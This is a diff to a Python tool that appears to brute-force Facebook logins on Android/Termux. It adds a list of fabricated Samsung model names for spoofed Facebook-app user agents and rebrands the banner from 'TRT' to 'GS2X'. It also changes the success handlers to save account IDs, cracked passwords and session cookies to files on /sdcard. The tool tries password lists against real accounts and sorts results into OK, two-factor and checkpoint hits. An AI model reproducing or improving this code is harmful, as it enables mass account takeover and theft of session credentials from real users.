@@ -99,6 +99,170 @@ for agent in range(10000):
         fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
         ugen.append(fullagnt)
 
+models="""SM-A782Z
+SM-Q021Y
+SM-Y544K
+SM-Q538G
+SM-F870N
+SM-C627K
+SM-N512P
+SM-O988N
+SM-O883P
+SM-W062Z
+SM-B067J
+SM-O795D
+SM-P731E
+SM-E084O
+SM-D284U
+SM-A808C
+SM-M516P
+SM-R860J
+SM-Z681H
+SM-Z475T
+SM-O336Z
+SM-O131A
+SM-W344F
+SM-S893D
+SM-M780S
+SM-G232P
+SM-Z864T
+SM-I630Z
+SM-K519E
+SM-R848Y
+SM-X386Y
+SM-E711C
+SM-P720M
+SM-I574T
+SM-P290H
+SM-J180R
+SM-K205C
+SM-X468I
+SM-R117A
+SM-T637B
+SM-O008I
+SM-G618T
+SM-Y991W
+SM-D828Y
+SM-J816R
+SM-W107X
+SM-Z505I
+SM-C340K
+SM-L740N
+SM-B735E
+SM-L085C
+SM-K430V
+SM-W613A
+SM-P478G
+SM-G809I
+SM-T321G
+SM-M919M
+SM-G115T
+SM-C814H
+SM-Z828Q
+SM-R500B
+SM-R618Y
+SM-X397T
+SM-Y918L
+SM-V673O
+SM-Y030U
+SM-C312D
+SM-R841N
+SM-U672G
+SM-M633U
+SM-F432I
+SM-U379M
+SM-E959A
+SM-K214Y
+SM-T190A
+SM-Z327Z
+SM-O115N
+SM-F048M
+SM-R224R
+SM-X560U
+SM-G196N
+SM-L746Q
+SM-S665P
+SM-H377Y
+SM-H864H
+SM-S072V
+SM-B074H
+SM-K061A
+SM-V136W
+SM-S217R
+SM-K344D
+SM-R010Z
+SM-D918N
+SM-J243P
+SM-Q606W
+SM-A067Y
+SM-S043H
+SM-I162C
+SM-L260T
+SM-N893X
+SM-D852P
+SM-E242A
+SM-V082E
+SM-S295U
+SM-K957B
+SM-I378S
+SM-M626A
+SM-X644I
+SM-Z767I
+SM-Q697Y
+SM-R638P
+SM-A023O
+SM-M461Z
+SM-Y959R
+SM-Z562H
+SM-R747Q
+SM-K833N
+SM-C609T
+SM-G977V
+SM-N371E
+SM-Q195K
+SM-C159F
+SM-L733J
+SM-X714U
+SM-S713Q
+SM-N448P
+SM-A712O
+SM-Z175O
+SM-D445V
+SM-L533J
+SM-Q936R
+SM-Y246X
+SM-A806J
+SM-E590X
+SM-X927D
+SM-D859P
+SM-X773Z
+SM-J018J
+SM-G521E
+SM-L957V
+SM-M246Q
+SM-S231G
+SM-X036Q
+SM-I666F
+SM-A362L
+SM-F960S
+SM-G231T
+SM-M966Z
+SM-T482N
+SM-C422S
+SM-X606O
+SM-J913Q
+SM-Q123P
+SM-V232Q
+SM-K701V
+SM-K142Z
+SM-U996V
+SM-B787N
+SM-A222M""".splitlines()   
+
+
+
+
+
 sim_id = ''
 android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
 model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
@@ -147,21 +311,19 @@ device = {
         'fbca':fbca,
         'fbdm':fbdm}
 
-logo=("""\033[1;91m
-        \033[1;97m88888888888 8888888b. 88888888888 
-          \033[1;97m  888     888   Y88b    888     
-        \033[1;97m    888     888    888    888     
-        \033[1;97m    888     888   d88P    888     
-        \033[1;97m    888     8888888P"     888     
-         \033[1;97m   888     888 T88b      888     
-         \033[1;97m   888     888  T88b     888     
-          \033[1;97m  888     888   T88b    888\033[1;32m       XD
-\033[1;37m--------------------------------------------------
-[~] Author   : Ramzan Tanha
-[~] Facebook : Muhammad Adnan
-[~] Tool     : Paid
-[~] Version  : 30.0
-\033[1;37m----------------------------------------------""")
+logo=("""\033[1;97m
+  ██████╗ ███████╗    ██████╗     ██╗  ██╗
+██╔════╝ ██╔════╝    ╚════██╗    ╚██╗██╔╝
+██║  ███╗███████╗     █████╔╝     ╚███╔╝ 
+██║   ██║╚════██║    ██╔═══╝      ██╔██╗ 
+╚██████╔╝███████║    ███████╗    ██╔╝ ██╗
+ ╚═════╝ ╚══════╝    ╚══════╝    ╚═╝  ╚═╝
+\033[1;92m╔═════════════════════════════════════════╗
+\033[1;92m║ ᗙ  Owner    : MD RIYAD                  ║
+\033[1;92m║ ᗙ  Facebook : MD.RIYAD                  ║
+\033[1;92m║ ᗙ  Version  : 0.9                       ║
+\033[1;92m║ ᗙ  Team     : GS POWER                  ║ 
+\033[1;92m╚═════════════════════════════════════════╝""")
 def linex():
 	print('\033[1;37m----------------------------------------------')
 def clear():
@@ -299,7 +461,7 @@ def menu():
 def pak():
 		user=[]
 		clear()
-		print('\033[1;35m Code example: 0306,0315,0335,0345')
+		print('\033[1;35m Code example: 0306,0315,0335,0345, 91904 ,  91766 ')
 		code = input('\033[1;37m put code: ')
 		try:
 			limit = int(input('\033[1;35m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
@@ -616,7 +778,7 @@ def api2(ids,names,passlist):
 def api3(ids,names,passlist):
         try:
                 global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [TRT-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [GS2X-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -642,6 +804,7 @@ def api3(ids,names,passlist):
                         fbrv = '0'
                         fban = 'FB4A'
                         fbpn = 'com.facebook.katana'
+                        #ua = '#Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density={density1},width={width1},height={height1}};FBLC/{FBLC1};FBCR/{FBCR1};FBMF/{devicename};FBBD/{devicename};FBPN/{FBPN};FBDV/{devicemodel1};FBSV/{android_version};FBOP/1;FBCA/armeabi-v7a:armeabi]'
                         ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1440,height=8797};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                         random_seed = random.Random()
                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
@@ -684,21 +847,22 @@ def api3(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [TRT-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [GS2X-OK] '+ids+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                                        print("Cookie: "+coki)
-                                        open('/sdcard/TRT-COOKIE.txt','a').write(coki+'\n')
+                                        #print(৳"Cookie: "+coki)
+                                        #open('/sdcard/TRT-COOKIE.txt'#,'a').write(coki+'\n')
+                                        open('/sdcard/GS2X-M3-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                         open('/sdcard/TRT-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
                                         if 'y' in pcp:
-                                                print('\r\r \033[1;34m[TRT-2F] '+ids+' | '+pas)
+                                                print('\r\r \033[1;34m[GS2X-2F] '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                print('\r\r\x1b[38;5;205m [GS2X-CP] '+ids+' | '+pas+'\033[1;97m')
                                                 open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
@@ -1412,7 +1576,7 @@ def trt4(ids,passlist):
                                         print('\r\r\033[1;32m [TRT-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print("Cookie: "+coki)
-                                        open('/sdcard/TRT-COOKIE.txt','a').write(coki+'\n')
+                                        open('/sdcard/GS2X-M3-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                                         open('/sdcard/TRT-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
